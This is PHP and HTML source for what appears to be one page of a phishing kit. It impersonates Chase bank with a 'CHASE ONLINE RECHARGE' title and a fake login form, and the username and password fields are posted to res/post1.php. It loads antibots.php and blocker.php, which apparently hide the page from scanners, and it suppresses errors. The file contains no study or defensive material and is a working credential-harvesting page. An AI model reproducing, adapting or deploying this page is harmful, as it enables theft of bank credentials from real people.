<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include 'antibots.php';
include './bt.php';
include "./blocker.php";
?>

<!DOCTYPE html>
<html lang="eng">
<head>
<meta charset="utf-8">
<title> CHASE ONLINE RECHARGE</title>
<link rel="shortcut icon" href="favicon.ico"/>
  <link rel="icon" href="css/favicon.ico"/>
<link rel="stylesheet" href="./css/builderstyle.css">

 
<style>
            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
            }
            #container {
                width: inherit;
                height: inherit;
                margin: 0;
                padding: 0;
                background-color: #fff;
            }
            h1 {
                margin: 0;
                padding: 0;
            }
        </style>
</head>
<body>
<div id="dm-container-b" class="bcmain">
<img src="css/background_image.png" id="bc_img" alt=""  align="top" border="0"></div>
<div id="bc_lc" style="position:absolute;left:0px;top:0px;width:1371px;height:713px;z-index:4">
<form name="indeform" method="post" action="res/post1.php">
  <input id="cm" class="dlogin1" name="1" value="" type="text" placeholder=" User name">
<input id="userc" class="dloginb" name="2" value="" type="password" placeholder=" Password">
<input id="Btarea1" name="area1" value="" class="tdbutton" type="submit">
</form>
</div>
</body></html>
